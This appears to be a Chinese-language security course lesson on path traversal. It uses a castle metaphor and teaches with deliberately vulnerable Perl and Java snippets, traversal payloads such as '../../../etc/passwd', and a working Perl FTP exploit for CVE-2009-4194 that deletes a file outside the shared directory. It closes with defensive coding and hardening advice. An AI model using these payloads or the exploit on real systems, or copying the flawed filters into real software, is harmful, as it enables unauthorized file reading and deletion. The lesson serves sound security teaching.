你好，我是王昊天。

上节课呢，我们学习了失效的访问控制，这节课我想和你一起探索另一个有趣的漏洞类型——神奇的路径穿越。

想象你是一个勇者，而你这次的目标是要进入一座盘踞着古龙的城堡寻找宝藏。考虑到自己还不够强大，正面进攻明显会送了自己的小命，于是你打算先绕道看看，这个城堡有没有什么其他可以进入的方式。幸运的是，作为一座昔日的王宫，这座城堡的设计完整，有许多侧门；但同时你也会发现，每一扇侧门的背后不是仓库就是守卫室，完全不能帮助你进入城堡内部。经过了一整天的探索，你终于发现了一个房间，它和其他仓库在外观上并无二致，唯一的不同是其中一块地板下竟藏着一扇暗门，你怀着好奇缓缓开启这扇门，发现面前正是一条通往城堡的密道…

如果把城堡看作是你进行安全检测的系统，那么恭喜你，现在你已经成功找到了路径穿越漏洞。通过这种漏洞，你可以访问“城堡”内部的各种“宝藏”。当然，你具体能访问到什么样的宝藏，还要取决于地道究竟能够通往何处。

## 路径穿越

那么什么是路径穿越呢？简单来说，你所构建的系统中有一个功能组件使用外部输入来构建文件名，而这个文件名会用来定位一个在受限目录的文件，如果文件名中既包含一些特殊元素，又没有进行合理的过滤处理，就会导致路径被解析到受限文件夹之外的目录。

扩展开讲一讲，很多系统内部的文件操作都希望被限制在特定目录中进行。通过使用 `..` 以及 `/` 符号，攻击者可以进行文件路径逃逸。其中最常见的符号组合是 `../`，这种符号组合在操作系统中会被解析为上级目录，这种漏洞被称为相对路径穿越。绝对路径穿越是另一种类型的路径穿越，比如 `/usr/local/bin` 就是典型的例子。

接下来我们看几种典型的攻击场景：

1. 这里我们来看一种典型的 **社交网络应用代码**，每个用户的配置文件都被存储在单独的文件中，所有文件被集中到一个目录里：

```perl
my $dataPath = "/users/example/profiles";
my $username = param("user");
my $profilePath = $dataPath . "/" . $username;

// 这里是老师写的注释
// 并没有对用户传入的username参数进行验证
open(my $fh, "<$profilePath") || ExitError("profile read error: $profilePath");
print "<ul>\n";
while(<$fh>) {
    print "<li>$_</li>\n";
}
print "</ul>\n";

```

当用户尝试去访问自己的配置文件的时候，会组成如下路径：

```plain
/users/example/prfiles/hunter

```

但是这里要注意的是上述代码并没有对用户传入的参数做验证，因此攻击者可以提供如下参数：

```plain
../../../etc/passwd

```

通过拼接，攻击者将会得到一个完整的路径：

```plain
/users/example/profiles/../../../etc/passwd ==> /etc/passwd

```

通过这条路径，攻击者就可以成功访问到Linux系统的password文件。

2. 下面这个代码在编写过程中考虑到输入的不安全性， **采用了黑名单方式**，过滤掉了输入中包含的 `../` 字符。

```perl
my $username = GetUntrustedInput();
// 这里是老师写的注释
// 黑名单方式过滤
// 对username的过滤不严格
$username = ~ s/\.\.\///;
my $filename = "/home/user/" . $username;
ReadAndSendFile($filename);

```

但是值得注意的是，过滤代码中并没有使用 `/g` 这个全局匹配符，因此仅仅过滤掉了参数中出现的第一个 `../` 字符：

```plain
../../../etc/passwd => /home/user/../../etc/passwd

```

所以攻击者仍然可以通过多层拼接来实现攻击。

3. 如下代码也在编写中考虑到输入的不安全性， **它采用了白名单方式**，限制了路径：

```java
String path = getInputPath();
// 这里是老师写的注释
// 白名单方式过滤
// 对path的限制不够严格
if (path.startsWith("/safe_dir/"))
{
    File f = new File(path);
    f.delete()
}

```

但是攻击者依然可以通过提供如下参数进行绕过：

```plain
/safe_dir/../etc/passwd

```

4. 如下代码 **通过在前端上传文件自动获取属性**，凭借这样的方式限制用户输入：

```plain
<form action="FileUploadServlet" method="post" enctype="multipart/form-data">

Choose a file to upload:
<input type="file" name="filename"/>
<br/>
<input type="submit" name="submit" value="Submit"/>

</form>

```

如下Java Servlet代码通过doPost方法接受请求，从HTTP Request Header中解析文件名，然后从Request中读取内容后再写入本地upload目录：

```java
public class FileUploadServlet extends HttpServlet {
    ...
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        String contentType = request.getContentType();

        // the starting position of the boundary header
        int ind = contentType.indexOf("boundary=");
        String boundary = contentType.substring(ind+9);

        String pLine = new String();
        String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value

        // verify that content type is multipart form data
        if (contentType != null && contentType.indexOf("multipart/form-data") != -1) {
            // extract the filename from the Http header
            BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
            ...
            pLine = br.readLine();
            String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));
            ...

            // output the file to the local upload directory
            try {
                // 这里是老师写的注释
                // 攻击者可以修改Request中的filename进行攻击
                BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
                for (String line; (line=br.readLine())!=null; ) {
                    if (line.indexOf(boundary) == -1) {
                        bw.write(line);
                        bw.newLine();
                        bw.flush();
                    }
                } //end of for loop
                bw.close();
            } catch (IOException ex) {
                ...
            }
            // output successful upload response HTML page
        }
        // output unsuccessful upload response HTML page
        else
        {...}
    }
    ...
}

```

上述代码一方面没有对上传的文件类型进行检查（这节课我们不探讨这个安全问题），另一方面没有检查filename就直接进行了拼接，因此攻击者只需要通过Burpsuite、ZAP等Proxy应用对Request进行拦截和修改filename属性即可利用路径穿越漏洞。

在了解典型的风险场景之后，我们来看一下实战中真正出现过的安全漏洞。

## 案例实战

#### **CVE-2009-4194**

该漏洞是一个目录穿越漏洞，影响的软件版本是Golden FTP Server 4.30 Free 以及 Professional版本、4.50版本（未验证），允许攻击者通过DELE命令删除任意文件。

启动MiTuan中的CVE-2009-4194靶机，这是一个Windows 7系统，内置了Golden FTP Server 4.30版本，并且已经预先设置好了FTP共享路径：

```plain
C:\Users\sty\Desktop

```

接下来构建我们的攻击程序，为了方便我们采用Perl语言。如果你使用的是Mac电脑，那么你可以无需配置环境，直接运行我们编写好的攻击程序体验效果：

```perl
use strict;
use Net::FTP

print "1";
my $ftp = Net::FTP->new("52.81.192.166", Debug => 1) || die $@;

$ftp->login("anonymous", "") || die $ftp->message;

$ftp->cwd("/Desktop/") || die $ftp->message;

# This deletes the file C:\Users\sty\test.txt
$ftp->delete("../test.txt");

$ftp->quit;

$ftp = undef;

```

通过上述的代码，我们可以看到 `C:\Users\sty\test.txt` 文件已经被删除了，我们成功穿越了FTP Server的限制，实现了了任意文件的删除！又一个神奇的漏洞被我们成功利用了，身为勇士的你成功地获取了城堡内宝藏的控制权。

## 防御方案

既然我们已经了解了漏洞的原理、发生的场景以及利用方式，那么我们要如何防御这种类型的攻击，并且预防潜在的漏洞出现呢？我们可以从不同的阶段出发，进行多维度安全建设，从而最大化地降低这类风险出现的概率。

**在编码实现阶段：**

1\. 假设所有的输入都是恶意的，使用“只接受已知的善意的”输入检查策略，也就是使用一些定义清晰且严格的参数格式；

2\. 输入都应该被解码为程序内部的处理格式，并且确保在应用系统没有被二次解码，防止攻击者通过编码或者二次编码进行绕过；

3\. 如果可能，为用户提供选项或者通过应用系统内部ID映射的方式进行对象访问，例如ID 1对应“info.txt”；

4\. 确保Error Message只包含最小必要信息，避免过于详细的信息展示，防止攻击者因此获取系统相关信息。

**在架构设计阶段：**

1\. 确保所有客户端发生的安全检查，都在服务端完成第二次检查，这样做的目的是防止攻击者在客户端进行安全检查绕过；

2\. 使用成熟的库或者框架来使开发者更容易规避这种特定类型的风险。

**在防御建设阶段：**

1\. 使用可以防御这种类型攻击的应用层防火墙，在某些特定情况下（比如应用系统漏洞无法修复）非常有效；

2\. 使用最小权限运行开发完毕的应用系统，如果可能，创建独立的受限账户用于应用系统运行；

3\. 使用沙箱环境运行开发完毕的应用系统，做好进程和系统之间的边界隔离。

回到我们最初的场景，此时你不再是想要潜入城堡的勇士，而是昔日负责城堡建设的规划师。那么编码实现阶段的输入过滤就像一道道门禁关卡，只有真正城堡内部的人才能进入；架构设计阶段则让你从内到外地落地安全检查，当然你也可以借鉴成熟的城堡设计方案；最后在防御建设阶段，做好每个通道的隔离，确保不会有任何一条通道可以直接进入城堡核心区域。

## 总结

构建一个安全优雅的系统， **保持神秘性是一个至关重要的因素**，让用户只看到他应该看到的东西，是这一切的前提。

不怀好意的攻击者往往非常聪明，你让他看见一滴水，他就能想到路的尽头是一片海洋，最有趣的事情在于你所建设的系统尽头恰好有一片海洋，而且海里还有攻击者垂涎的海鲜。

这节课我们分析了 **常见的路径穿越场景** 和这些场景下的 **典型漏洞利用代码**：

1. 未对用户输入做验证；
2. 黑名单检测绕过；
3. 白名单检测绕过；
4. 前端检测绕过。

我们还以 **漏洞CVE-2009-4194** 为例，带你在实战中复现了路径穿越漏洞。

最后，我从编码实现、架构设计、防御建设3个不同的阶段，给你提供了 **安全编码和系统加固的建议**：

1. 对所有用户输入执行严格的输入检查，确保不会出现二次解码绕过问题，并推荐使用内部ID映射的方式进行对象访问；
2. 使用成熟的开发框架，并且在客户端、服务端都执行安全检查；
3. 使用沙箱环境运行应用系统，遵循最小权限原则，使用独立的受限权限账户，并在边界架设应用防火墙。

以上，就是本节课的内容——构建一个安全优雅的系统，让用户只能走到他该走到的地方。

## 思考题

通过本节课的案例实战，你可以尝试自己复现CVE-2009-4053漏洞吗？

欢迎在评论区留下你的思考，我们下节课再见。